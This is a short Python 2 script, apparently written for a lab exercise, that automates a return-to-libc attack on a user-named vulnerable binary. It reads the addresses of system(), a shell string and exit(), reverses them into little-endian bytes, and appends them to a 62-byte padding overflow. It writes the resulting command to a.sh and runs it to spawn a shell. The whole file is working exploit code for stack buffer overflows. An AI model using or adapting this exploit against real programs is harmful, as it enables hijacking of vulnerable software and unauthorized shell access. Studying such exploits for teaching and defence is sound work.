#!/usr/bin/env python
import os
import subprocess

class ReturnToLibc:

	def __init__(self):
		self.vulnerable_file = raw_input('Enter Vulnerable File Name(finalVul attached): ');
		self.input_system_address = raw_input('Enter System Address: ');
		self.input_shell_address = raw_input('Enter shell Address: ');
		self.input_exit_address = raw_input('Enter Exit() Address: ');
		self.shell_file = "a.sh";

	def reverse_me(self,address):
		
		return "\\x"+address[6]+address[7]+"\\x"+address[4]+address[5]+"\\x"+address[2]+address[3]+"\\x"+address[0]+address[1];

	def write_sh_file(self,shellcode):
		with open (self.shell_file,"w") as f:
			f.write(shellcode)
		return True

	def attack(self):
		system_address = self.reverse_me(self.input_system_address)
		shell_address = self.reverse_me(self.input_shell_address)
		exit_address = self.reverse_me(self.input_exit_address)
		shellcode = "./"+self.vulnerable_file + ''' "`python -c 'print "A"*62 + "''' + system_address + exit_address + shell_address + '''"'`"''' + ' bb'
		if self.write_sh_file(shellcode):	
			subprocess.call(["sh", self.shell_file])
		
if __name__ == "__main__":
    attack_obj = ReturnToLibc()
    attack_obj.attack()		
